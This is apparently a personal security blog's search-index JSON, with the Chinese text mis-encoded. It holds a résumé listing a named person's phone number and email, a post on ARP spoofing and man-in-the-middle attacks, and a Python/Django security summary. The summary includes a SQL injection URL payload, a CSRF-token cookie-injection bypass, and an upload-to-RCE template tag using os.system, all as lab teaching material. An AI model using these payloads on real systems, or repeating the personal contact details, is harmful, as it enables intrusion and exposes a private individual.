{"meta":{"title":"Hexo","subtitle":"","description":"æœªæ¥å¯æœŸ","author":"future.zhangyan","url":"https://zhangyanlady.github.io"},"pages":[{"title":"bangumis","date":"2018-01-04T16:00:00.000Z","updated":"2020-09-17T05:25:08.734Z","comments":true,"path":"bangumis/index.html","permalink":"https://zhangyanlady.github.io/bangumis/index.html","excerpt":"","text":""},{"title":"å…³äºæˆ‘","date":"2017-07-10T08:36:26.000Z","updated":"2020-09-15T06:26:46.325Z","comments":true,"path":"about/index.html","permalink":"https://zhangyanlady.github.io/about/index.html","excerpt":"","text":"å¼ è‰³ æ€§åˆ«ï¼šå¥³ å·¥ä½œç»éªŒï¼š3 å¹´ ï¼ˆä¸€å¹´æ¸—é€æµ‹è¯•ã€ä¸¤å¹´pythonå¼€å‘ï¼‰ ç°å±…ä½åœ°ï¼šåŒ—äº¬ è”ç³»æ–¹å¼ Telï¼š18601296871 E-mailï¼šFuture.zhangyan@gmail.com blog: https://zhangyanlady.github.io/ ä¸“ä¸šæŠ€èƒ½ ç†Ÿæ‚‰webå®‰å…¨ç›¸å…³çŸ¥è¯†ï¼Œèƒ½ç‹¬ç«‹åˆ©ç”¨ä¸­é—´ä»¶ Apache/IIS/Tomcatç­‰æ­å»ºæ”»é˜²ç¯å¢ƒï¼Œè¿˜åŸæ¼æ´æ”»å‡»è¿‡ç¨‹ ç†Ÿæ‚‰OWASP Top10å®‰å…¨æ¼æ´ï¼Œç†Ÿç»ƒæŒæ¡SQLæ³¨â¼Š/XSS/CSRF/æ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´åˆ©ç”¨æ–¹æ³• èƒ½å¤Ÿç†Ÿç»ƒä½¿â½¤Appscanï¼ŒAWVSï¼ŒBurpsuiteï¼ŒSQLmapï¼ŒNmapç­‰å·¥å…·è¿›è¡Œæ¸—é€ ç†Ÿæ‚‰æ¸—é€æµ‹è¯•æ­¥éª¤ï¼Œèƒ½å¤Ÿç‹¬ç«‹å®Œæˆæ¸—é€æµ‹è¯•æŠ¥å‘Šçš„ç¼–å†™ ç†Ÿæ‚‰å¸¸è§Windowså¹³å°å’ŒLinuxå¹³å°æ¸—é€æµ‹è¯•å·¥å…·çš„ä½¿ç”¨ ç†Ÿæ‚‰æ¼æ´æŒ–æ˜(é»‘ç›’æˆ–ç™½ç›’)ï¼Œç†Ÿæ‚‰æ¼æ´çš„å†…åœ¨åŸç†å’Œåˆ©ç”¨æ–¹æ³• ç†Ÿæ‚‰pythonã€phpã€å‰ç«¯è¯­è¨€ä»¥åŠæ•°æ®åº“ï¼Œèƒ½å¯¹ç›¸å…³åº”ç”¨è¿›è¡Œä»£ç å®¡è®¡ï¼Œå¹¶ä½¿ç”¨pythonå®Œæˆâ¼€äº›è„šæœ¬çš„ç¼–å†™ å·¥ä½œç»å† 2019å¹´9æœˆâ€”â€”è‡³ä»Š æ™¨çŸ³ç§‘æŠ€ æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆ 2017å¹´7æœˆâ€”â€”2019å¹´8æœˆ é¬¼å·¥ç§‘æŠ€ pythonå¼€å‘å·¥ç¨‹å¸ˆ é¡¹ç›®ç»éªŒ é¡¹ç›®åç§°: Apollo é¡¹ç›®æè¿°: é¡¹ç›®é€šè¿‡SaaSäº§å“å°†ä¼ä¸šå¸‚åœºé£é™©é¢„æµ‹å’Œè¡ç”Ÿå“å®šä»·å’Œä¼šè®¡å˜å¾—è½»æ¾ï¼ŒçœŸæ­£å¸®ä¼ä¸šç”¨ç²¾ç¡®é‡åŒ–å’Œç³»ç»Ÿçš„æ–¹å¼æ¥ç®¡ç†ä¼ä¸šè‡ªèº«çš„å¸‚åœºé£é™©ã€‚ç›®å‰å·²æœ‰å¤šå®¶ä¸–ç•Œ500å¼ºå¤§å‹ä¼ä¸šè¯•ç”¨å’Œæ„å‘å®¢æˆ·ã€‚ é¡¹ç›®èŒè´£: è´Ÿè´£é¡¹ç›®æ¼æ´æ‰«æã€æ¸—é€æµ‹è¯•ã€æºä»£ç å®¡è®¡ å®‰å…¨ç›‘æ§ã€ç—…æ¯’é˜²èŒƒã€è¡¥ä¸å‡çº§ç­‰å·¥ä½œï¼› åšä¸€äº›æ£€æŸ¥ã€å®‰å…¨åŠ å›ºç­‰å·¥ä½œ å·¡æ£€ä¸€äº›æ—¥å¸¸ä¸­é—´ä»¶å’Œæ•°æ®åº“ æ•´ç†ç¼–å†™æ¼æ´æŠ¥å‘Š ååŠ©å¹¶å‚ä¸å…¶ä»–éƒ¨é—¨æ‹Ÿå®šï¼Œä¸ä¿¡æ¯å®‰å…¨ç®¡ç†ç›¸å…³çš„æ–‡æ¡£ã€‚ è´Ÿè´£å°†åç«¯å’Œé‡åŒ–ç»„çš„æ•°æ®é€šè¿‡ redis è¿›è¡Œäº¤äº’ï¼Œé€šè¿‡ pandas + numpy è¿›è¡Œè§£æ è´Ÿè´£å°†ç”¨æˆ·ä¸Šä¼ çš„pdfæ–‡ä»¶å­˜å…¥Elasticsearchï¼Œå¹¶æå–æœ‰ç”¨ä¿¡æ¯è¿”å›ç»™ç”¨æˆ·excel æ–‡ä»¶ é¡¹ç›®åç§°: Kismartå¥èº«å·¥ä½œå®¤ç®¡ç†ç³»ç»Ÿ é¡¹ç›®æè¿°: Kismartå¥èº«å·¥ä½œå®¤ç®¡ç†ç³»ç»Ÿæ˜¯ä¸€æ¬¾é€‚ç”¨äºå¥èº«å·¥ä½œå®¤çš„ç®¡ç†å·¥å…·ï¼ŒåŠŸèƒ½æƒé™è‡ªç”±æ­é…ï¼Œçµæ´»é€‚ç”¨ä¸åŒåœºæ™¯ï¼ŒåŠŸèƒ½è¦†ç›–å›¢æ“ç®¡ç†ã€ç§æ•™ç®¡ç†ç­‰ï¼Œå…·æœ‰èšç„¦ã€é«˜æ•ˆã€æ˜“ç”¨ã€çµæ´»ç­‰ç‰¹ç‚¹ é¡¹ç›®èŒè´£: åŸºäº Django çš„åå°ç®¡ç†å¹³å°ï¼Œé‡‡ç”¨ RBAC æƒé™ç®¡ç†æœºåˆ¶ï¼Œä»¥åŠåŠŸèƒ½æ¨¡å—åŒ– ä½¿ç”¨ Supervisoræ¥ç›‘æ§æœåŠ¡å™¨è¿›ç¨‹ï¼Œè‡ªåŠ¨æ¢å¤è¿›ç¨‹ ä½¿ç”¨ echarts è¿›è¡Œç»˜å›¾ï¼Œå®æ—¶ç»Ÿè®¡è´¢åŠ¡ç®¡ç† å®Œæˆç§æ•™æ’è¯¾ï¼Œç§æ•™é¢„çº¦ï¼Œç§æ•™æ›´æ¢ç­‰ä¼—å¤šåŠŸèƒ½ æŠ€æœ¯æ ˆï¼š Python + Mysql + Django + Supervisor + echarts + Vue + Element_UI é¡¹ç›®åç§°ï¼škisfitï¼ˆç§»åŠ¨ç«¯ï¼‰ é¡¹ç›®æè¿°: å¸®åŠ©å¥èº«ä¿±ä¹éƒ¨æ›´å¿«çš„æ¨åŠ¨äº’è”ç½‘åŒ–çš„å‡çº§ï¼Œå¢å¼ºå¯¹ä¼šå‘˜çš„æ·±åº¦æœåŠ¡ã€‚ä¼šå‘˜å¯åœ¨çº¿åŠç†ä¸šåŠ¡ï¼Œæ¥æ”¶ä¿±ä¹éƒ¨æ¶ˆæ¯ä¸é€šçŸ¥ï¼Œè·å–è¿åŠ¨çš„æ•°æ®ä¸æ™ºèƒ½åˆ†æç»“æœï¼Œåœ¨çº¿å‚ä¸ä¿±ä¹éƒ¨è¿åŠ¨æ’åä¸ç«èµ›ã€‚ é¡¹ç›®èŒè´£: è´Ÿè´£é›†æˆä¸‰æ–¹æ”¯ä»˜ä¸å¹³å°ä¸­ï¼Œä¾¿æ·ç”¨æˆ·åœ¨çº¿ä»˜è´¹ åˆ©ç”¨ websocket å°†ä¿±ä¹éƒ¨æ¶ˆæ¯ä¸é€šçŸ¥ä¸»åŠ¨æ¨é€ï¼ŒèŠ‚çº¦å¸¦å®½èµ„æº åˆ©ç”¨ååŒè¿‡æ»¤ç®—æ³•å¯¹ä¼šå‘˜è¿›è¡Œç§æ•™æ¨èåŠè¯¾ç¨‹çš„æ™ºèƒ½æ¨èã€‚ è´Ÿè´£å®Œæˆäº’åŠ¨åœˆï¼Œç”¨æˆ·å…³æ³¨åŠè¯„è®ºç›–æ¥¼ç­‰åŠŸèƒ½ï¼Œç”¨ä»¥å¢åŠ ç”¨æˆ·ç²˜æ€§ã€‚ æŠ€æœ¯æ ˆï¼š Python + Mysql + Django + websocket + ååŒè¿‡æ»¤ç®—æ³• + Vue + Element_UI è‡ªæˆ‘è¯„ä»· æœ¬äººç¨³é‡ã€çœŸè¯šï¼›å·¥ä½œè®¤çœŸè´Ÿè´£ï¼Œç§¯æä¸»åŠ¨ï¼Œèƒ½åƒè‹¦è€åŠ³ï¼Œå‹‡äºæ‰¿å—å‹åŠ›ï¼›æœ‰å¾ˆå¼ºå›¢é˜Ÿåä½œç²¾ç¥ï¼Œå…·æœ‰è¾ƒå¼ºçš„é€‚åº”èƒ½åŠ›ï¼›çºªå¾‹æ€§å¼ºï¼Œå·¥ä½œç§¯æé…åˆï¼›æ„å¿—åšå¼ºï¼Œå…·æœ‰è¾ƒå¼ºçš„æ— ç§å¥‰çŒ®ç²¾ç¥ï¼›ä¸Šè¿›å¿ƒå¼ºã€å‹¤äºå­¦ä¹ èƒ½ä¸æ–­æé«˜è‡ªèº«çš„èƒ½åŠ›ä¸ç»¼åˆç´ è´¨ã€‚åœ¨æœªæ¥çš„å·¥ä½œä¸­ï¼Œæˆ‘å°†ä»¥å……æ²›çš„ç²¾åŠ›ï¼Œåˆ»è‹¦é’»ç ”çš„ç²¾ç¥æ¥åŠªåŠ›å·¥ä½œï¼Œç¨³å®šåœ°æé«˜è‡ªå·±çš„å·¥ä½œèƒ½åŠ›ï¼Œä¸ä¼ä¸šåŒæ­¥å‘å±•ã€‚"},{"title":"tags","date":"2017-07-10T08:36:26.000Z","updated":"2020-09-14T05:37:24.553Z","comments":true,"path":"tags/index.html","permalink":"https://zhangyanlady.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2017-07-10T08:36:26.000Z","updated":"2020-09-13T05:08:59.831Z","comments":true,"path":"categories/index.html","permalink":"https://zhangyanlady.github.io/categories/index.html","excerpt":"","text":""},{"title":"Book","date":"2020-09-15T06:38:34.000Z","updated":"2020-09-17T05:34:20.137Z","comments":true,"path":"book/index.html","permalink":"https://zhangyanlady.github.io/book/index.html","excerpt":"","text":"ç½‘ç»œå®‰å…¨ç½‘ç»œå®‰å…¨ å¼€å‘pythoné«˜çº§ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Flask &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Django redis celery æ•°æ®åˆ†æ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;çˆ¬è™« å…¬ä¼—å· å‰ç«¯ é¢è¯•æ‚¦å“¥-pythonå¼€å‘é¢è¯•è¦ç‚¹ ä¸ªäººé¢è¯•æ€»ç»“"}],"posts":[{"title":"ä¸­é—´äººæ”»å‡»","slug":"ä¸­é—´äººæ”»å‡»","date":"2020-09-22T12:56:31.000Z","updated":"2020-09-20T09:00:26.392Z","comments":true,"path":"2020/09/22/ä¸­é—´äººæ”»å‡»/","link":"","permalink":"https://zhangyanlady.github.io/2020/09/22/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/","excerpt":"","text":"ä»€ä¹ˆæ˜¯ARPåè®® ARPï¼ˆAddress Resolution Protocolï¼‰åœ°å€è§£æåè®®ï¼Œç›®çš„æ˜¯å®ç°IPåœ°å€åˆ°MACåœ°å€çš„è½¬æ¢ã€‚åœ¨è®¡ç®—æœºé—´é€šä¿¡çš„æ—¶å€™ï¼Œè®¡ç®—æœºè¦çŸ¥é“ç›®çš„è®¡ç®—æœºæ˜¯è°ï¼ˆå°±åƒæˆ‘ä»¬äººäº¤æµä¸€æ ·ï¼Œè¦çŸ¥é“å¯¹æ–¹æ˜¯è°ï¼‰ï¼Œè¿™ä¸­é—´éœ€è¦æ¶‰åŠåˆ°MACåœ°å€ï¼Œè€ŒMACæ˜¯çœŸæ­£çš„ç”µè„‘çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚ä¸ºä»€ä¹ˆéœ€è¦ARPåè®®å‘¢ï¼Ÿå› ä¸ºåœ¨OSIä¸ƒå±‚æ¨¡å‹ä¸­ï¼Œå¯¹æ•°æ®ä»ä¸Šåˆ°ä¸‹è¿›è¡Œå°è£…å‘é€å‡ºå»ï¼Œç„¶åå¯¹æ•°æ®ä»ä¸‹åˆ°ä¸Šè§£åŒ…æ¥æ”¶ï¼Œä½†æ˜¯ä¸Šå±‚ï¼ˆç½‘ç»œå±‚ï¼‰å…³å¿ƒçš„IPåœ°å€ï¼Œä¸‹å±‚å…³å¿ƒçš„æ˜¯MACåœ°å€ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦æ˜ å°„IPå’ŒMACã€‚ 1234567891011ARPå‘½ä»¤å¸¸è§ç”¨æ³•ï¼š1ã€arp -s Ip ç‰©ç†åœ°å€å¯ä»¥å‘ARpé«˜é€Ÿç¼“å­˜ä¸­äººå·¥è¾“å…¥ä¸€ä¸ªé™æ€é¡¹ç›®ã€‚è¯¥é¡¹ç›®åœ¨è®¡ç®—æœºå¼•å¯¼è¿‡ç¨‹ä¸­å°†ä¿æŒæœ‰æ•ˆçŠ¶æ€ï¼Œæˆ–è€…åœ¨å‡ºç°é”™è¯¯æ—¶ï¼Œäººå·¥é…ç½®çš„ç‰©ç†åœ°å€å°†è‡ªåŠ¨æ›´æ–°è¯¥é¡¹ç›®ã€‚2ã€arp -aæˆ–arp â€“gç”¨äºæŸ¥çœ‹é«˜é€Ÿç¼“å­˜ä¸­çš„æ‰€æœ‰é¡¹ç›®ã€‚-aå’Œ-gå‚æ•°çš„ç»“æœæ˜¯ä¸€æ ·çš„ï¼Œå¤šå¹´æ¥-gä¸€ç›´æ˜¯UNIXå¹³å°ä¸Šç”¨æ¥æ˜¾ç¤ºARpé«˜é€Ÿç¼“å­˜ä¸­æ‰€æœ‰é¡¹ç›®çš„é€‰é¡¹ï¼Œè€ŒWindowsç”¨çš„æ˜¯arp -aï¼ˆ-aå¯è¢«è§†ä¸ºallï¼Œå³å…¨éƒ¨çš„æ„æ€ï¼‰ï¼Œä½†å®ƒä¹Ÿå¯ä»¥æ¥å—æ¯”è¾ƒä¼ ç»Ÿçš„-gé€‰é¡¹ã€‚3ã€arp -d Ipä½¿ç”¨è¯¥å‘½ä»¤èƒ½å¤Ÿäººå·¥åˆ é™¤ä¸€ä¸ªé™æ€é¡¹ç›®ã€‚ ARPæ¬ºéª—çš„å±å®³ ARPæ¬ºéª—å¯ä»¥é€ æˆå†…éƒ¨ç½‘ç»œçš„æ··ä¹±ï¼Œè®©æŸäº›è¢«æ¬ºéª—çš„è®¡ç®—æœºæ— æ³•æ­£å¸¸è®¿é—®å†…å¤–ç½‘ï¼Œè®©ç½‘å…³æ— æ³•å’Œå®¢æˆ·ç«¯æ­£å¸¸é€šä¿¡ï¼Œä¹Ÿå¯ä»¥æˆªå–å…¨ç½‘ç»œæ•°æ®åŒ…ç­‰ã€‚å®é™…ä¸Šä»–çš„å±å®³è¿˜ä¸ä»…ä»…å¦‚æ­¤ï¼Œä¸€èˆ¬æ¥è¯´IPåœ°å€çš„å†²çªæˆ‘ä»¬å¯ä»¥é€šè¿‡å¤šç§æ–¹æ³•å’Œæ‰‹æ®µæ¥é¿å…ï¼Œè€ŒARPåè®®å·¥ä½œåœ¨æ›´ä½å±‚ï¼Œéšè”½æ€§æ›´é«˜ã€‚ç³»ç»Ÿå¹¶ä¸ä¼šåˆ¤æ–­ARPç¼“å­˜çš„æ­£ç¡®ä¸å¦ï¼Œæ— æ³•åƒIPåœ°å€å†²çªé‚£æ ·ç»™å‡ºæç¤ºã€‚ ARPæ¬ºéª—åŸç†ä¹Ÿå«ä¸­é—´äººæ¬ºéª— è®¾çˆ±ä¸½ä¸ï¼ˆAliceï¼‰å¸Œæœ›ä¸é²ä¼¯ï¼ˆBobï¼‰é€šä¿¡ã€‚åŒæ—¶ï¼Œé©¬æ´›é‡Œï¼ˆMalloryï¼‰å¸Œæœ›æ‹¦æˆªçªƒä¼šè¯ä»¥è¿›è¡Œçªƒå¬å¹¶å¯èƒ½åœ¨æŸäº›æ—¶å€™ä¼ é€ç»™é²ä¼¯ä¸€ä¸ªè™šå‡çš„æ¶ˆæ¯ã€‚é¦–å…ˆï¼Œçˆ±ä¸½ä¸ä¼šå‘é²å‹ƒç´¢å–ä»–çš„å…¬é’¥ã€‚å¦‚æœBobå°†ä»–çš„å…¬é’¥å‘é€ç»™Aliceï¼Œå¹¶ä¸”æ­¤æ—¶é©¬æ´›é‡Œèƒ½å¤Ÿæ‹¦æˆªåˆ°è¿™ä¸ªå…¬é’¥ï¼Œå°±å¯ä»¥å®æ–½ä¸­é—´äººæ”»å‡»ã€‚é©¬æ´›é‡Œå‘é€ç»™çˆ±ä¸½ä¸ä¸€ä¸ªä¼ªé€ çš„æ¶ˆæ¯ï¼Œå£°ç§°è‡ªå·±æ˜¯é²ä¼¯ï¼Œå¹¶ä¸”é™„ä¸Šäº†é©¬æ´›é‡Œè‡ªå·±çš„å…¬é’¥ï¼ˆè€Œä¸æ˜¯é²ä¼¯çš„ï¼‰ã€‚çˆ±ä¸½ä¸æ”¶åˆ°å…¬é’¥åç›¸ä¿¡è¿™ä¸ªå…¬é’¥æ˜¯é²ä¼¯çš„ï¼Œäºæ˜¯çˆ±ä¸½ä¸å°†å¥¹çš„æ¶ˆæ¯ç”¨é©¬æ´›é‡Œçš„å…¬é’¥ï¼ˆçˆ±ä¸½ä¸ä»¥ä¸ºæ˜¯é²ä¼¯çš„ï¼‰åŠ å¯†ï¼Œå¹¶å°†åŠ å¯†åçš„æ¶ˆæ¯å›ç»™é²ä¼¯ã€‚é©¬æ´›é‡Œå†æ¬¡æˆªè·çˆ±ä¸½ä¸å›ç»™é²ä¼¯çš„æ¶ˆæ¯ï¼Œå¹¶ä½¿ç”¨é©¬æ´›é‡Œè‡ªå·±çš„ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œè§£å¯†ï¼Œå¦‚æœé©¬æ´›é‡Œæ„¿æ„ï¼Œå¥¹ä¹Ÿå¯ä»¥å¯¹æ¶ˆæ¯è¿›è¡Œä¿®æ”¹ï¼Œç„¶åé©¬æ´›é‡Œä½¿ç”¨é²ä¼¯åŸå…ˆå‘ç»™çˆ±ä¸½ä¸çš„å…¬é’¥å¯¹æ¶ˆæ¯å†æ¬¡åŠ å¯†ã€‚å½“é²ä¼¯æ”¶åˆ°æ–°åŠ å¯†åçš„æ¶ˆæ¯æ—¶ï¼Œä»–ä¼šç›¸ä¿¡è¿™æ˜¯ä»çˆ±ä¸½ä¸é‚£é‡Œå‘æ¥çš„æ¶ˆæ¯ã€‚æˆ‘ä»¬çš„èº«ä»½å°±æ˜¯Malloryï¼Œæˆ‘ä»¬å¸Œæœ›æ¬ºéª—Aliceå’ŒBobï¼Œè®©å…¶è®¤ä¸ºæˆ‘ä»¬æ˜¯äº¤äº’çš„æ­£ç¡®ç›®æ ‡ï¼Œä»è€Œæ¥è·å–ä»–ä»¬ä¹‹é—´äº¤æµçš„ä¿¡æ¯ ARPå®‰å…¨é˜²èŒƒ1ã€ä¸è¦éšæ„ç™»å½•å…è´¹çš„WIFIï¼Œæ²¡äººçŸ¥é“å…è´¹çš„WIFIæ˜¯ä¸æ˜¯æœ‰æ¶æ„çš„æ”»å‡»è€…åœ¨æé¬¼ï¼› 2:ä½¿ç”¨ARPç»‘å®šï¼Œ é¿å…è¢«ARPæ¬ºéª—ï¼› 3:å¼€å¯ç”µè„‘ç®¡å®¶æˆ–è€…360å®‰å…¨å«å£«çš„ARPé˜²ç«å¢™æˆ–é‡‘å±±è´å£³æˆ–å½©å½±ARPé˜²ç«å¢™ï¼› 4:ä½¿ç”¨httpsåè®®æˆ–è€…å…¶ä»–æœ‰ä¿å¯†åè®®çš„è¿æ¥è®¿é—®å¤–ç½‘ï¼Œé¿å…è¢«å‘ã€‚5ã€æ‰‹å·¥é™æ€ç»‘å®šç¼–å†™ä¸€ä¸ªæ‰¹å¤„ç†æ–‡ä»¶å‘½åä¸ºxx.batï¼Œå°†æ‰¹å¤„ç†æ–‡ä»¶æ”¾åˆ°â€œWindowsâ†’å¼€å§‹â†’ç¨‹åºâ†’å¯åŠ¨â€ä¸­ï¼Œå¦‚æœéœ€è¦ç«‹å³ç”Ÿæ•ˆï¼Œè¯·è¿è¡Œæ­¤æ–‡ä»¶ã€‚æ‰¹å¤„ç†æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š@echo offarp ï¼darp -s 192.168.0.115 00-16-36-f7-bd-5e //ipä¸MACåœ°å€æ ¹æ®å…·ä½“æƒ…å†µä¿®æ”¹ã€‚","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"python-web-å®‰å…¨æ€»ç»“","slug":"python-web-å®‰å…¨æ€»ç»“","date":"2020-09-20T09:08:18.000Z","updated":"2020-09-20T09:11:43.061Z","comments":true,"path":"2020/09/20/python-web-å®‰å…¨æ€»ç»“/","link":"","permalink":"https://zhangyanlady.github.io/2020/09/20/python-web-%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/","excerpt":"","text":"xss pythonä¸‹çš„xsså…¶åŸç†è·Ÿphpæ˜¯ä¸€æ ·çš„ï¼Œdjangoè¿‘å¹´çš„ä¾‹å­å¦‚ä¸‹ï¼š CVE-2017-12794,æ­¤ä¾‹ä¸­é€šè¿‡æŠ›å‡ºå¼‚å¸¸é€ æˆxssã€‚ sqlæ³¨å…¥ ä¸€èˆ¬æ¥è¯´ä½¿ç”¨djangoè‡ªå¸¦çš„æ“ä½œæ•°æ®åº“apiæ˜¯ä¸ä¼šé€ æˆsqlæ³¨å…¥çš„,å¦‚ä¸‹ï¼š 1Person.objects.filter(first_name&#x3D;request.GET.get(&#39;user&#39;)) ä¸è¿‡djangoä¾ç„¶æ”¯æŒåŸç”Ÿsqlè¯­æ³•çš„ä½¿ç”¨æ–¹æ³•,å¦‚ä¸‹ï¼š 1234def index(request, *args, **kwargs): for e in Person.objects.raw(&#39;select * from FIRST_Person &#39;): print(e.first_name,e.last_name) return render(request, &#39;home.html&#39;) æ§åˆ¶å°ç»“æœå¦‚ä¸‹ï¼š 123asd sdfmapl0 pppadmin hahaha å¦‚æœä»£ç å¦‚ä¸‹ï¼š 1234def index(request, *args, **kwargs): for e in Person.objects.raw(&#39;select * from FIRST_Person WHERE first_name &#x3D; &#39; + &#39;&quot;&#39; + request.GET.get(&#39;user&#39;) + &#39;&quot;&#39;): print(e.last_name) return render(request, &#39;home.html&#39;) è®¿é—®http://127.0.0.1:8000/?user=adminåæ§åˆ¶å°è¿”å›hahaha è€Œè®¿é—®http://127.0.0.1:8000/?user=qqq%22%20or%20%221ï¼Œæ§åˆ¶å°ç›´æ¥è¿”å›äº† 123sdfppphahaha ä»£ç /å‘½ä»¤æ‰§è¡Œ é™¤å†…å»ºçš„æ¨¡å—ï¼Œè¿˜æœ‰os,commands,subprocess,multiprocessing,ptyï¼ŒCpickle/pickleï¼ŒPyYAMLç­‰æ¨¡å—èƒ½ä»£ç /å‘½ä»¤æ‰§è¡Œï¼Œè¯¦ç»†å¯çœ‹ä¸‹æ–‡ã€‚ CSRF djangoè¿™ç±»çš„æ¡†æ¶è‡ªå¸¦csrfé˜²æŠ¤ï¼Œä¸è¿‡åœ¨å»å¹´ä¾ç„¶çˆ†å‡ºcsrfæ¼æ´CVE-2016-7401-Djangoï¼ˆçŸ¥é“åˆ›å®‡è¿™ç¯‡åˆ†æå¾ˆç»†è‡´ï¼‰ï¼Œå¦‚æœdjangoä½¿ç”¨äº†Google Analyticsåˆ™å¯èƒ½ç»•è¿‡djangoè‡ªå¸¦çš„csrfé˜²æŠ¤æœºåˆ¶ã€‚ Djangoå¯¹äºCSRFçš„é˜²æŠ¤å°±æ˜¯åˆ¤æ–­cookieä¸­çš„csrftokenå’Œæäº¤çš„csrfmiddlewaretokençš„å€¼æ˜¯å¦ç›¸ç­‰ï¼Œä½†æ˜¯Google Analyticså¯ä»¥é€šè¿‡refererå¸®æˆ‘ä»¬è®¾ç½®ç”¨æˆ·çš„cookieï¼Œcookieä¸€èˆ¬å¦‚ä¸‹ï¼š 1utmz&#x3D;123456.123456789.11.2.utmcsr&#x3D;[HOST]|utmccn&#x3D;(referral)|utmcmd&#x3D;referral|utmcct&#x3D;[PATH] å…¶ä¸­[HOST]å’Œ[PATH]æ˜¯ç”±Refererç¡®å®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å½“ 1Referer: http:&#x2F;&#x2F;x.com&#x2F;helloworld æ—¶ï¼Œcookieå¦‚ä¸‹ï¼š 1z&#x3D;123456.123456789.11.2.utmcsr&#x3D;x.com|utmccn&#x3D;(referral)|utmcmd&#x3D;referral|utmcct&#x3D;helloworld djangoåœ¨å½“æ—¶çš„ç‰ˆæœ¬æœ‰cookieè§£ææ¼æ´ï¼Œå½“Cookie.SimpleCookie()è§£æa=hello]b=worldè¿™æ ·çš„å­—ç¬¦ä¸²æ—¶ï¼Œå°±ä¼šå–å¾—a=helloå’Œb=worldï¼Œæ‰€ä»¥å½“Refererä¸ºhttp://x.com/hello]csrftoken=worldï¼Œcsrftokenå°±è¢«æˆåŠŸèµ‹å€¼ã€‚ è¯¦ç»†çš„ä»£ç åˆ†æï¼Œå€¼å¾—ä¸€çœ‹ã€‚ æ–‡ä»¶ä¸Šä¼  åœ¨phpç¯å¢ƒä¸‹å¦‚æœä¸é™åˆ¶ä¸Šä¼ æ–‡ä»¶åç¼€ä¼šå¯¼è‡´getshellï¼Œä½†åœ¨djangoä¸‹ï¼Œå¦‚æœä¸Šä¼ çš„æ–‡ä»¶èƒ½è¦†ç›–ç±»ä¼¼url.pyï¼Œinit.pyçš„æ–‡ä»¶ï¼Œæ”»å‡»è€…èƒ½é¡ºåˆ©getshellã€‚å‚è€ƒhttps://www.secpulse.com/archives/36220.html ã€‚è¿˜æœ‰djangoåªæœ‰åœ¨development serverçš„æ¨¡å¼ä¸‹æ‰ä¼šä¿®æ”¹äº†æ–‡ä»¶å°±ç«‹åˆ»é‡å¯ï¼Œå¦åˆ™ä¿®æ”¹äº†æ–‡ä»¶ä¹Ÿæš‚æ—¶æ— æ³•ç”Ÿæ•ˆã€‚ å½“ç„¶é™¤æ­¤ä¹‹å¤–è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼Œä¾‹å¦‚å†™cronï¼ˆå‰ææ˜¯æœ‰æƒé™ï¼‰ï¼Œå’Œæ¨¡æ¿æ–‡ä»¶ã€‚ ç®€å•è¯´ä¸€ä¸‹å†™æ¨¡æ¿æ–‡ä»¶çš„è¿‡ç¨‹ï¼š éœ€è¦åœ¨templatetagså’Œtemplatesåˆ†åˆ«å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼ˆå¯èƒ½ä¹Ÿä¸å«templatetagsï¼Œå¯è‡ªè¡Œå®šä¹‰ï¼‰ï¼Œtemplatetagsæ–‡ä»¶å¤¹å†…å­˜æ”¾è‡ªå®šä¹‰æ ‡ç­¾ï¼Œä¸Šä¼ æ–‡ä»¶rce.pyï¼Œä»£ç å¦‚ä¸‹ï¼š 1234567from django import templateimport osregister &#x3D; template.Library()@register.simple_tagdef some_function(value): shell &#x3D; os.system(&#39;touch mapl0&#39;) return shell templatesæ–‡ä»¶å¤¹å­˜æ”¾é™æ€htmlæ–‡ä»¶ï¼Œä¸Šä¼ æ–‡ä»¶home.htmlå¦‚ä¸‹ï¼š 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&#123;% load rce %&#125;&#123;% some_function &quot;%s&quot; as func %&#125;&lt;p&gt; command is &#123;&#123; func &#125;&#125; &lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; åœ¨viewé‡Œï¼Œindexä¼šä½¿ç”¨è¿™ä¸ªæ¨¡æ¿ï¼š 12def index(request, *args, **kwargs): return render(request, &#39;home.html&#39;) è®¿é—®åï¼Œå°±åœ¨é¡¹ç›®ç›®å½•ç”Ÿæˆäº†mapl0æ–‡ä»¶ã€‚ 